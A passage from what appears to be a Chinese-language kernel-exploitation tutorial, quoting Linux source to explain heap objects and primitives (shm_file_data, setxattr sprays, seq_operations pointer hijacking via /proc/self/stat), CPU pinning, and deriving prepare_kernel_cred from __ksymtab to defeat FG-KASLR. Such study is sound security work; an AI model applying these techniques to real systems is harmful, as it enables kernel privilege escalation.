class="keyword">if</span> (vma-&gt;vm_ops &amp;&amp; vma-&gt;vm_ops-&gt;close)</span><br><span class="line">        vma-&gt;vm_ops-&gt;close(vma);</span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>在这里调用了该 vma 的 vm_ops 对应的 close 函数，我们将目光重新放回共享内存对应的 vma 的初始化的流程当中，在 shmat() 中注意到如下逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">do_shmat</span><span class="params">(<span class="type">int</span> shmid, <span class="type">char</span> __user *shmaddr, <span class="type">int</span> shmflg,</span></span><br><span class="line"><span class="params">          ulong *raddr, <span class="type">unsigned</span> <span class="type">long</span> shmlba)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">sfd = kzalloc(<span class="keyword">sizeof</span>(*sfd), GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!sfd) &#123;</span><br><span class="line">        fput(base);</span><br><span class="line">        <span class="keyword">goto</span> out_nattch;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    file = alloc_file_clone(base, f_flags,</span><br><span class="line">              is_file_hugepages(base) ?</span><br><span class="line">                &amp;shm_file_operations_huge :</span><br><span class="line">                &amp;shm_file_operations);</span><br></pre></td></tr></table></figure><p>在这里调用了 <code>alloc_file_clone()</code> 函数，其会调用 <code>alloc_file()</code> 函数将第三个参数赋值给新的 file 结构体的 f_op 域，在这里是 <code>shm_file_operations</code> 或 <code>shm_file_operations_huge</code>，定义于 <code>/ipc/shm.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">shm_file_operations</span> =</span> &#123;</span><br><span class="line">    .mmap        = shm_mmap,</span><br><span class="line">    .fsync        = shm_fsync,</span><br><span class="line">    .release    = shm_release,</span><br><span class="line">    .get_unmapped_area    = shm_get_unmapped_area,</span><br><span class="line">    .llseek        = noop_llseek,</span><br><span class="line">    .fallocate    = shm_fallocate,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * shm_file_operations_huge is now identical to shm_file_operations,</span></span><br><span class="line"><span class="comment"> * but we keep it distinct for the sake of is_file_shm_hugepages().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">shm_file_operations_huge</span> =</span> &#123;</span><br><span class="line">    .mmap        = shm_mmap,</span><br><span class="line">    .fsync        = shm_fsync,</span><br><span class="line">    .release    = shm_release,</span><br><span class="line">    .get_unmapped_area    = shm_get_unmapped_area,</span><br><span class="line">    .llseek        = noop_llseek,</span><br><span class="line">    .fallocate    = shm_fallocate,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在这里对于关闭 shm 文件，对应的是 <code>shm_release</code> 函数，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">shm_release</span><span class="params">(<span class="keyword">struct</span> inode *ino, <span class="keyword">struct</span> file *file)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">shm_file_data</span> *<span class="title">sfd</span> =</span> shm_file_data(file);</span><br><span class="line"></span><br><span class="line">    put_ipc_ns(sfd-&gt;ns);</span><br><span class="line">    fput(sfd-&gt;file);</span><br><span class="line">    shm_file_data(file) = <span class="literal">NULL</span>;</span><br><span class="line">    kfree(sfd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>即当我们进行 shmdt 系统调用时便可以释放 <code>shm_file_data</code> 结构体</p><h2 id="setxattr"><a href="#setxattr" class="headerlink" title="setxattr"></a>setxattr</h2><p><strong>setxattr</strong>是一个系统调用允许进程设置文件系统对象的扩展属性，但在 kernel pwn 当中这同样是一个十分有用的系统调用，利用这个系统调用，我们可以进行内核空间中任意大小的 object 的分配，<strong>通常需要配合 userfaultfd 系统调用</strong>完成进一步的利用</p><p><strong>任意大小 object 分配(GFP_KERNEL)&amp; 释放</strong></p><p>观察 setxattr 源码，发现如下调用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SYS_setxattr()</span><br><span class="line">    path_setxattr()</span><br><span class="line">        setxattr()</span><br></pre></td></tr></table></figure><p>在 <code>setxattr()</code> 函数中有如下逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span></span><br><span class="line"><span class="title function_">setxattr</span><span class="params">(<span class="keyword">struct</span> dentry *d, <span class="type">const</span> <span class="type">char</span> __user *name, <span class="type">const</span> <span class="type">void</span> __user *value,</span></span><br><span class="line"><span class="params">     <span class="type">size_t</span> size, <span class="type">int</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">        kvalue = kvmalloc(size, GFP_KERNEL);</span><br><span class="line">        <span class="keyword">if</span> (!kvalue)</span><br><span class="line">            <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">        <span class="keyword">if</span> (copy_from_user(kvalue, value, size)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//,..</span></span><br><span class="line"></span><br><span class="line">    kvfree(kvalue);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的 value 和 size 都是由我们来指定的，即<strong>我们可以分配任意大小的 object 并向其中写入内容，之后该对象会被释放掉</strong></p><p>使用时按照以下格式,其中第一个字符串需要是本进程的文件名,第二个字符串任意</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setxattr(<span class="string">&quot;/tmp/exp&quot;</span>, <span class="string">&quot;abcdefg&quot;</span>, &amp;buf,len,<span class="number">0</span>);</span><br></pre></td></tr></table></figure><h2 id="seq-file"><a href="#seq-file" class="headerlink" title="seq_file"></a>seq_file</h2><p><strong>序列文件接口</strong>（Sequence File Interface）是针对 procfs 默认操作函数每次只能读取一页数据从而难以处理较大 proc 文件的情况下出现的，其为内核编程提供了更为友好的接口</p><p><code>seq_file</code> 结构体定义于<code>/include/linux/seq_file.h</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_file</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> *buf;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">size_t</span> from;</span><br><span class="line">    <span class="type">size_t</span> count;</span><br><span class="line">    <span class="type">size_t</span> pad_until;</span><br><span class="line">    <span class="type">loff_t</span> index;</span><br><span class="line">    <span class="type">loff_t</span> read_pos;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">lock</span>;</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> *<span class="title">op</span>;</span></span><br><span class="line">    <span class="type">int</span> poll_event;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    <span class="type">void</span> *private;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>但这个结构体是通过<code>seq_open()</code> 使用kzalloc从单独的<code>seq_file_cache</code>分配的,我们很难进行操控</p><p>不过其中的函数表成员 op 在打开文件时通过 kmalloc 进行动态分配</p><p>为了更进一步简化内核接口的实现，seq_file 接口提供了 single_open() 这个简化的初始化 file 的函数，其定义于 <code>fs/seq_file.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">single_open</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">int</span> (*show)(<span class="keyword">struct</span> seq_file *, <span class="type">void</span> *),</span></span><br><span class="line"><span class="params">        <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> *<span class="title">op</span> =</span> kmalloc(<span class="keyword">sizeof</span>(*op), GFP_KERNEL_ACCOUNT);</span><br><span class="line">    <span class="type">int</span> res = -ENOMEM;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (op) &#123;</span><br><span class="line">        op-&gt;start = single_start;</span><br><span class="line">        op-&gt;next = single_next;</span><br><span class="line">        op-&gt;stop = single_stop;</span><br><span class="line">        op-&gt;show = show;</span><br><span class="line">        res = seq_open(file, op);</span><br><span class="line">        <span class="keyword">if</span> (!res)</span><br><span class="line">            ((<span class="keyword">struct</span> seq_file *)file-&gt;private_data)-&gt;private = data;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            kfree(op);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(single_open);</span><br></pre></td></tr></table></figure><p>seq_operations定义于 <code>/include/linux/seq_file.h</code> 当中，只定义了四个函数指针，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">    <span class="type">void</span> * (*start) (<span class="keyword">struct</span> seq_file *m, <span class="type">loff_t</span> *pos);</span><br><span class="line">    <span class="type">void</span> (*stop) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">    <span class="type">void</span> * (*next) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v, <span class="type">loff_t</span> *pos);</span><br><span class="line">    <span class="type">int</span> (*show) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其会从kmalloc-32中申请obj</p><h3 id="分配与释放"><a href="#分配与释放" class="headerlink" title="分配与释放"></a>分配与释放</h3><p>前面我们得知通过 single_open() 函数可以分配 seq_operations 结构体，阅读内核源码，我们注意到存在如下调用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">stat_open()        &lt;--- stat_proc_ops.proc_open</span><br><span class="line">    single_open_size()</span><br><span class="line">        single_open()</span><br></pre></td></tr></table></figure><p>注意到 stat_open() 为 procfs 中的 stat 文件对应的 proc_ops 函数表中 open 函数对应的默认函数指针，在内核源码 <code>fs/proc/stat.c</code> 中有如下定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_ops</span> <span class="title">stat_proc_ops</span> =</span> &#123;</span><br><span class="line">    .proc_flags    = PROC_ENTRY_PERMANENT,</span><br><span class="line">    .proc_open    = stat_open,</span><br><span class="line">    .proc_read_iter    = seq_read_iter,</span><br><span class="line">    .proc_lseek    = seq_lseek,</span><br><span class="line">    .proc_release    = single_release,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">proc_stat_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    proc_create(<span class="string">&quot;stat&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>, &amp;stat_proc_ops);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">fs_initcall(proc_stat_init);</span><br></pre></td></tr></table></figure><p>即该文件对应的是 <code>/proc/id/stat</code> 文件，那么只要我们打开 <code>proc/self/stat</code> 文件便能分配到新的 seq_operations 结构体</p><p>对应地，在定义于 <code>fs/seq_file.c</code> 中的 <code>single_release()</code> 为 stat 文件的 proc_ops 的默认 release 指针，其会释放掉对应的 seq_operations 结构体，故我们只需要关闭文件即可释放该结构体</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p><strong>数据泄露</strong></p><p>seq_operations 结构体中有着四个内核指针,若能泄露则可获得内核<code>.text</code>的基址</p><p><strong>劫持内核执行流</strong></p><p>当我们 read 一个 stat 文件时，内核会调用其 proc_ops 的 <code>proc_read_iter</code> 指针，其默认值为 <code>seq_read_iter()</code> 函数，定义于 <code>fs/seq_file.c</code> 中，注意到有如下逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">seq_read_iter</span><span class="params">(<span class="keyword">struct</span> kiocb *iocb, <span class="keyword">struct</span> iov_iter *iter)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seq_file</span> *<span class="title">m</span> =</span> iocb-&gt;ki_filp-&gt;private_data;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    p = m-&gt;op-&gt;start(m, &amp;m-&gt;index);</span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>即其会调用 seq_operations 中的 start 函数指针，那么<strong>我们只需要控制 seq_operations-&gt;start 后再读取对应 stat 文件便能控制内核执行流</strong></p><p><code>read(seq_fd,buf,10)</code></p><h2 id="cpu绑定"><a href="#cpu绑定" class="headerlink" title="cpu绑定"></a>cpu绑定</h2><p>slub allocator 会优先从当前核心的 <code>kmem_cache_cpu</code> 中进行内存分配，在多核架构下存在多个 <code>kmem_cache_cpu</code> ，由于进程调度算法会保持核心间的负载均衡，因此我们的 exp 进程可能会被在不同的核心上运行，这也就导致了利用过程中 kernel object 的分配有可能会来自不同的 <code>kmem_cache_cpu</code> ，这使得利用模型变得复杂，也降低了漏洞利用的成功率</p><p>因此为了保证漏洞利用的稳定，<strong>需要将进程绑定到特定的某个 CPU 核心上</strong>，这样 slub allocator 的模型对我们而言便简化成了 <code>kmem_cache_node + kmem_cache_cpu</code> ，我们也能更加方便地进行漏洞利用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* to run the exp on the specific core only */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_cpu</span><span class="params">(<span class="type">int</span> core)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="fgkaslr"><a href="#fgkaslr" class="headerlink" title="fgkaslr"></a>fgkaslr</h2><p>即Function Granular KASLR,参考(<a href="https://lwn.net/Articles/877487/">Function Granular KASLR</a>)</p><p>传统的kaslr具有以下2个缺点:</p><ol><li>低熵,针对代码段随机化粒度较小,运气好几百次就能够爆破出来</li><li>只要泄露出一个地址,那么所有的地址都会被暴露</li></ol><p>fgkaslr可以看作是kaslr的plus版,它在函数级粒度上随机化地址空间的布局</p><p>其依赖于GCC可以选择将函数放入单独的<code>.text</code>部分,在开启fgkasalr后任何用 C 编写且不存在于特殊输入部分的内容都是随机的,被单独归为<code>.text.*</code>。当然如果是直接用汇编写的,那么依然会被保留在<code>.text</code></p><blockquote><p>The boot kernel was modified to parse the vmlinux elf file after<br>decompression to check for our interesting symbols that we kept, and to<br>look for any .text.<em> sections to randomize. The consolidated .text section<br>is skipped and not moved. The sections are shuffled randomly, and copied<br>into memory following the .text section in a new random order. The existing<br>code which updated relocation addresses was modified to account for<br>not just a fixed delta from the load address, but the offset that the function<br>section was moved to. This requires inspection of each address to see if<br>it was impacted by a randomization. We use a bsearch to make this less<br>horrible on performance. Any tables that need to be modified with new<br>addresses or resorted are updated using the symbol addresses parsed from the<br>elf symbol table.引导内核被修改为在解压后解析 vmlinux elf 文件，以检查我们保留的有趣符号，并查找任何要随机化的 .text.</em> 部分。合并的 .text 部分将被跳过且不会移动。这些部分被随机打乱，并以新的随机顺序复制到 .text 部分之后的内存中。更新重定位地址的现有代码经过修改，不仅考虑了加载地址的固定增量，还考虑了函数部分移动到的偏移量。这需要检查每个地址以查看它是否受到随机化的影响。我们使用 bsearch 来减少这种对性能的影响。任何需要用新地址修改或重新排序的表都使用从 elf 符号表解析的符号地址进行更新。In order to hide our new layout, symbols reported through /proc/kallsyms<br>will be sorted by name alphabetically rather than by address.为了隐藏我们的新布局，通过 /proc/kallsyms 报告的符号将按名称字母顺序而不是地址排序。</p></blockquote><p>随机化判断逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    linux/arch/x86/boot/compressed/fgkaslr.c</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">layout_randomized_image</span><span class="params">(<span class="type">void</span> *output, Elf64_Ehdr *ehdr, Elf64_Phdr *phdrs)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    shnum = ehdr-&gt;e_shnum; <span class="comment">//获取节区的数量</span></span><br><span class="line">    shstrndx = ehdr-&gt;e_shstrndx; <span class="comment">//获取字符串的索引</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">/* we are going to need to allocate space for the section headers */</span></span><br><span class="line">    sechdrs = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(*sechdrs) * shnum); <span class="comment">//开辟一段空间用于防止节区头部</span></span><br><span class="line">    <span class="keyword">if</span> (!sechdrs)</span><br><span class="line">        error(<span class="string">&quot;Failed to allocate space for shdrs&quot;</span>);</span><br><span class="line"></span><br><span class="line">    sections = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(*sections) * shnum); <span class="comment">//开辟一段空间用户防止节区的内容</span></span><br><span class="line">    <span class="keyword">if</span> (!sections)</span><br><span class="line">        error(<span class="string">&quot;Failed to allocate space for section pointers&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(sechdrs, output + ehdr-&gt;e_shoff,</span><br><span class="line">          <span class="keyword">sizeof</span>(*sechdrs) * shnum); <span class="comment">//拷贝头部数据</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* we need to allocate space for the section string table */</span></span><br><span class="line">    s = &amp;sechdrs[shstrndx]; <span class="comment">//获取节区名</span></span><br><span class="line"></span><br><span class="line">    secstrings = <span class="built_in">malloc</span>(s-&gt;sh_size); <span class="comment">//开辟一段空间用于防止节区名称</span></span><br><span class="line">    <span class="keyword">if</span> (!secstrings)</span><br><span class="line">        error(<span class="string">&quot;Failed to allocate space for shstr&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(secstrings, output + s-&gt;sh_offset, s-&gt;sh_size); <span class="comment">//拷贝节区名称</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * now we need to walk through the section headers and collect the</span></span><br><span class="line"><span class="comment">     * sizes of the .text sections to be randomized.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; shnum; i++) &#123; <span class="comment">//遍历节区，选择需要重定位的节区</span></span><br><span class="line">        s = &amp;sechdrs[i];</span><br><span class="line">        sname = secstrings + s-&gt;sh_name;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (s-&gt;sh_type == SHT_SYMTAB) &#123; <span class="comment">//遇到符号节区跳过</span></span><br><span class="line">            <span class="comment">/* only one symtab per image */</span></span><br><span class="line">            <span class="keyword">if</span> (symtab)</span><br><span class="line">                error(<span class="string">&quot;Unexpected duplicate symtab&quot;</span>);</span><br><span class="line"></span><br><span class="line">            symtab = <span class="built_in">malloc</span>(s-&gt;sh_size);</span><br><span class="line">            <span class="keyword">if</span> (!symtab)</span><br><span class="line">                error(<span class="string">&quot;Failed to allocate space for symtab&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">memcpy</span>(symtab, output + s-&gt;sh_offset, s-&gt;sh_size);</span><br><span class="line">            num_syms = s-&gt;sh_size / <span class="keyword">sizeof</span>(*symtab);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(sname, <span class="string">&quot;.text&quot;</span>)) &#123; <span class="comment">//第一个.text的节区直接跳过</span></span><br><span class="line">            <span class="keyword">if</span> (text)</span><br><span class="line">                error(<span class="string">&quot;Unexpected duplicate .text section&quot;</span>);</span><br><span class="line">            text = s;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(sname, <span class="string">&quot;.data..percpu&quot;</span>)) &#123; <span class="comment">//遇到.data..precpu的节区也直接跳过</span></span><br><span class="line">            <span class="comment">/* get start addr for later */</span></span><br><span class="line">            percpu = s;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!(s-&gt;sh_flags &amp; SHF_ALLOC) ||</span><br><span class="line">            !(s-&gt;sh_flags &amp; SHF_EXECINSTR) ||</span><br><span class="line">            !(strstarts(sname, <span class="string">&quot;.text&quot;</span>))) <span class="comment">//若一个节区具有SHF_ALLOC与SHF_EXECINSTR的标志位，并且节区名的前缀属于.text则会进行细粒度的地址随机化</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        sections[num_sections] = s; <span class="comment">//剩余的节区都放置到新开辟的空间中，进行细粒度的地址随机化</span></span><br><span class="line">        num_sections++;</span><br><span class="line">    &#125;</span><br><span class="line">    sections[num_sections] = <span class="literal">NULL</span>;</span><br><span class="line">    sections_size = num_sections;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，只有同时满足以下条件的节区才会参与随机化</p><ul><li>节区名符合 <code>.text.*</code> </li><li>section flags 中包含<code>SHF_ALLOC</code></li><li>section flags 中包含<code>SHF_EXECINSTR</code></li></ul><p>不过好在<code>.text</code>中就有很多可以利用的gadget,可以将其弱化为kaslr</p><h3 id="ksymtab"><a href="#ksymtab" class="headerlink" title="__ksymtab"></a>__ksymtab</h3><p>fgkaslr会提供<code>__ksymtab</code>表以支持随机化,而<code>__ksymtab</code>又是不随机化的,所以可以通过其泄露地址</p><p><strong>ksymtab 中每个记录项的名字的格式为 `</strong>ksymtab_func_name<code>，以</code>prepare_kernel_cred<code>为例，对应的记录项的名字为</code>__ksymtab_prepare_kernel_cred`，因此，我们可以直接通过该名字在 IDA 里找到对应的位置，如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__ksymtab:FFFFFFFF81F8D4FC __ksymtab_prepare_kernel_cred dd 0FF5392F4h</span><br><span class="line">__ksymtab:FFFFFFFF81F8D500                 dd 134B2h</span><br><span class="line">__ksymtab:FFFFFFFF81F8D504                 dd 1783Eh</span><br></pre></td></tr></table></figure><p><code>__ksymtab</code> 每一项的结构为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kernel_symbol</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> value_offset;</span><br><span class="line">    <span class="type">int</span> name_offset;</span><br><span class="line">    <span class="type">int</span> namespace_offset;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>第一个表项记录了重定位表项相对于当前地址的偏移。那么，<code>prepare_kernel_cred</code> 的地址应该为 <code>0xFFFFFFFF81F8D4FC-(2**32-0xFF5392F4)=0xffffffff814c67f0</code>。实际上也确实如此。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text.prepare_kernel_cred:FFFFFFFF814C67F0                 public prepare_kernel_cred</span><br><span class="line">.text.prepare_kernel_cred:FFFFFFFF814C67F0 prepare_kernel_cred 